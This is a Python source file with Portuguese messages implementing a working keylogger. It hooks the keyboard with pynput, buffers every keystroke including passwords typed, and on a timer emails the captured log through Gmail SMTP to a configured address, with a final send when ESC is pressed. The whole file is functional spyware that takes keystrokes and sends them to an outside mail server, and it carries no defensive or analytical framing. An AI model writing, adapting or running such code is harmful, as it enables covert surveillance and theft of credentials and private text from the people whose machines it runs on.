from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import datetime

# Importar configurações de email
try:
    from config_email import EMAIL_ORIGEM, EMAIL_DESTINO, SENHA_EMAIL, INTERVALO_ENVIO
except ImportError:
    print("ERRO: Arquivo config_email.py não encontrado!")
    print("1. Copie config_email.py para sua pasta")
    print("2. Configure suas credenciais de email")
    print("3. Execute o keylogger novamente")
    exit(1)

# Teclas especiais ignoradas
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

# Variável global para armazenar logs
log = ""

def enviar_email():
    global log
    if log.strip():  # Só envia se houver conteúdo
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        conteudo_email = f"Logs capturados em {timestamp}:\n\n{log}"
        
        msg = MIMEText(conteudo_email, 'plain', 'utf-8')
        msg['Subject'] = f'Keylogger Log - {timestamp}'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            print(f"Enviando email com {len(log)} caracteres capturados...")
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            print("Email enviado com sucesso!")
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

        log = ""  # Limpa log após envio

    # Agenda próximo envio
    Timer(INTERVALO_ENVIO, enviar_email).start()

def on_press(key):
    global log
    try:
        # Tecla alfanumérica
        log += key.char
    except AttributeError:
        # Tecla especial
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
            print("ESC pressionado. Enviando logs finais e parando...")
            # Envia logs finais antes de parar
            if log.strip():
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                conteudo_email = f"Logs finais capturados em {timestamp}:\n\n{log}"
                
                msg = MIMEText(conteudo_email, 'plain', 'utf-8')
                msg['Subject'] = f'Keylogger Log Final - {timestamp}'
                msg['From'] = EMAIL_ORIGEM
                msg['To'] = EMAIL_DESTINO

                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(EMAIL_ORIGEM, SENHA_EMAIL)
                    server.send_message(msg)
                    server.quit()
                    print("Logs finais enviados!")
                except Exception as e:
                    print(f"Erro ao enviar logs finais: {e}")
            return False
        elif key in IGNORAR:
            pass    
        else:
            log += f"[{key}]"

if __name__ == "__main__":
    print("Keylogger com envio de email iniciado.")
    print(f"Emails serão enviados a cada {INTERVALO_ENVIO//60} minutos.")
    print("Pressione ESC para parar.")
    
    # Inicia o timer para envio de emails
    Timer(INTERVALO_ENVIO, enviar_email).start()
    
    # Inicia o keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    print("Keylogger parado.")